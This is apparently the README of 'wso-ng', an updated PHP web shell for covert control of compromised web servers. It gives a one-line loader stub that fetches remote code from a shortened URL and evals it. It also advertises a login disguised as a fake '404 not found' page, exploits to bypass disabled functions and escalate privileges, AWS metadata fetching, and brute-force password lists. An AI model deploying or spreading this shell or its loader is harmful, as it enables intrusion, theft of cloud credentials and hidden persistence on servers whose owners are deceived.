[![Twitter Follow](https://img.shields.io/twitter/follow/0xbadad?style=social)](https://twitter.com/0xbadad)
# wso-ng
New generation of famous WSO web shell. With perks included
# default password is "root"
![image](https://user-images.githubusercontent.com/1212294/149636180-7af99caf-a6c4-4475-a42d-0bd818cb67b1.png)
![image](https://user-images.githubusercontent.com/1212294/149636349-e580a04e-846f-4240-8b94-644d6e9aca5a.png)

# changes
- can now hook password when loaded via stub ```<?php eval(substr(file_get_contents('https://bit.ly/get-wso-ng?pass=ed78a48738eb97ffb5624741bdf391c3'), 5)); ?>```, and will use it instead of hardcoded one
- all subfile downloads are now cached in /tmp and zipped
- login page show natural site "404 not found" page. Just type password and press Enter, cuz password field hidden offscreen, but focused already.
- new breadcrumps navigation panel. Must be much more usefull.
- all files\dirs are now highlighted as their edit\view rights
- go to file\path right from breadcrumps field
- **add fastCGI exploit to auto-elevate & bypass disabled functions, when possible**
- **add php add-filter exploit to bypass disabled functions and gain console execution, when possible**
- ajax interaction now is default
- Ctrl+Enter on any field to Save\Run
- added "Fetch AWS metadata" command to bookmarks
- added hotlink to "Linux Exploit Suggester v2" by default.
- added VirusTotal integration, to autocheck IP reputation.
- added https://securitytrails.com integration, to show neighbors on same IP.
- added ip-info integration to show domains on same server
- added reverse ip check, to show real IP, and not local.
- added memory, cores and load average info to top bar.
- click on IP to copy it
- added list of open ports & sockets to *Sec. Info* section. Works ever if no console priveleges available, thru *fsock*.
- added support for phpRedis in *Sec. Info* section.
- reworked "Userful" section. Works thru limits of open basedir now.
- you can touch files right in file list of file manager now.
- fast copy name\path to clipboard by click.
- **neat syntax highlighting everywhere**.
- neat PHP code editing with autoindent support.
- default top1000 password list (https://bit.ly/top1kpass) in "Bruteforce" section. 
